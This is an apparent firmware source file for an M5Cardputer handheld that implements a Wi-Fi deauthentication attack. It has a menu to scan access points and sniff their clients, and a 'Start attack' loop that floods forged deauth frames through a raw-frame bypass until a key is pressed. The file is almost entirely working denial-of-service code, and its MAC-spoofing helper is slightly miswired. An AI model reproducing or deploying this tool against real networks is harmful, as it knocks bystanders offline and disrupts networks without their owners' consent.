#include "deauther.h"

void send_deauth(const uint8_t *source_mac, const uint8_t *client_addr, const uint8_t *ap_addr) {
    static uint8_t deauth_frame[sizeof(deauth_frame_default)];

    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));

    memcpy(&deauth_frame[4], source_mac, 6);
    memcpy(&deauth_frame[10], ap_addr, 6);
    memcpy(&deauth_frame[16], client_addr, 6);

    wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
}

void trollDeauth(const uint8_t *client_addr, const uint8_t *ap_addr) {
    uint8_t source_addr[6];
    generate_random_mac(source_addr);

    send_deauth(client_addr,ap_addr,ap_addr);
}

int Deauther() {
    start_wifi(WIFI_MODE_STA, true);

    int Selector = 0;
    struct menu Menu;

    Menu.name = "~/WiFi/Dthr";
    Menu.length = 3;  // Select Ap, clientmac, statack
    Menu.elements = new item[Menu.length];

    strcpy(Menu.elements[0].name, "Select AP");
    Menu.elements[0].type = 1;
    Menu.elements[0].length = 0;
    for (int i = 0; i < MAX_OPTIONS; i++) {
        Menu.elements[0].options[i] = NULL;
    }

    strcpy(Menu.elements[1].name, "Select Client");
    Menu.elements[1].type = 1;
    Menu.elements[1].length = 0;
    for (int i = 0; i < MAX_OPTIONS; i++) {
        Menu.elements[1].options[i] = NULL;
    }

    strcpy(Menu.elements[2].name, "Start attack");
    Menu.elements[2].type = 1;
    Menu.elements[2].length = 0;
    for (int i = 0; i < MAX_OPTIONS; i++) {
        Menu.elements[2].options[i] = NULL;
    }

    drawMenu(Menu, Selector);

    int UPp, DOWNp, LEFTp, RIGHTp, SELECTp, RETURNp;
    int aps_count = 0;
    int clients_count = 0;
    AP* aps = NULL;
    mac_addr_t* clients = NULL;


    while (1) {
        M5Cardputer.update();
        if (M5Cardputer.Keyboard.isPressed()) {
            UPp = M5Cardputer.Keyboard.isKeyPressed(';');
            DOWNp = M5Cardputer.Keyboard.isKeyPressed('.');
            LEFTp = M5Cardputer.Keyboard.isKeyPressed(',');
            RIGHTp = M5Cardputer.Keyboard.isKeyPressed('/');
            SELECTp = M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER);
            RETURNp = M5Cardputer.Keyboard.isKeyPressed('`');

            if (RETURNp) {
                stop_wifi();
                vTaskDelay(pdMS_TO_TICKS(300));

                return 0;
            }
            else if (UPp) {
                Selector = intChecker(Selector - 1, Menu.length);
                vTaskDelay(pdMS_TO_TICKS(50));
            }
            else if (DOWNp) {
                Selector = intChecker(Selector + 1, Menu.length);
                vTaskDelay(pdMS_TO_TICKS(50));
            }
            else if (LEFTp && (Menu.elements[Selector].type == 0)) {
                Menu.elements[Selector].selector = intChecker(Menu.elements[Selector].selector - 1, Menu.elements[Selector].length);
                vTaskDelay(pdMS_TO_TICKS(50));
            }
            else if (RIGHTp  && (Menu.elements[Selector].type == 0)) {
                Menu.elements[Selector].selector = intChecker(Menu.elements[Selector].selector + 1, Menu.elements[Selector].length);
                vTaskDelay(pdMS_TO_TICKS(50));
            }
            if (SELECTp) {
                M5GFX_clear_screen();
                vTaskDelay(pdMS_TO_TICKS(300));
                
                switch (Selector) {
                    case 0: // Select AP
                        M5GFX_display_text(0, 0, "Scanning...\r", TFT_WHITE);
                        aps = select_wifi_menu(&aps_count);
                        M5GFX_display_text(0, 0, "", TFT_WHITE);
                        M5GFX_clear_screen();

                        for (int i = 0; i < aps_count; i ++) {
                            printf ("%d: %s\n", i, aps[i].name);
                        }


                        if (!aps) {
                            printf("No access points Selected.\n");
                            return -1;
                        }

                        break;
                    case 1:
                        char buffer[100]; // Assume this is large enough to hold your final string.
                        sprintf(buffer, "Sniffing clients...\nFor %d selected APs\nDuring 10s", aps_count);
                        printf("%s\n", buffer); // Print the string to verify

                        M5GFX_display_text(0, 0, buffer, TFT_WHITE);

                        clients = select_client_menu(&clients_count, aps, aps_count);
                        M5GFX_display_text(0, 0, "", TFT_WHITE);
                        M5GFX_clear_screen();

                        // for (int i = 0; i < clients_count; i ++) {
                        //     printf ("%d: %02x:%02x:%02x:%02x:%02x:%02x\n", i, clients[i][0],clients[i][1],clients[i][2],clients[i][3],clients[i][4],clients[i][5]);
                        // }

                        if (!clients) {
                            printf("No access points Selected.\n");
                            return -1;
                        }

                        break;
                    case 2:  // Start attack
                        if (!aps||!clients) {
                            LogError("AP or Client is NULL");
                            break;
                        }

                        init_pps_timer();
                        vTaskDelay(pdMS_TO_TICKS(100));
                        M5Cardputer.update();

                        stop_wifi();
                        vTaskDelay(pdMS_TO_TICKS(100)); 
                        start_wifi(WIFI_MODE_AP, true);

                        int wait = 1;
                        while (wait) {
                            M5Cardputer.update();
                            if (M5Cardputer.Keyboard.isPressed()) {
                                wait = 0;
                            }

                            for (int i = 0; i < aps_count; i++) {
                                for (int j = 0; j < clients_count; j++) {
                                    trollDeauth(clients[j].mac , aps[i].address);                                            
                                    packet_count++;
                                    vTaskDelay(pdMS_TO_TICKS(50));
                                }
                            }
                        }
                        stop_pps_timer();

                        stop_wifi();
                        start_wifi(WIFI_MODE_STA, true);
                        vTaskDelay(pdMS_TO_TICKS(300));

                        break;
                }
            }
            drawMenu(Menu, Selector);
        }
        vTaskDelay(pdMS_TO_TICKS(50));
    }
}
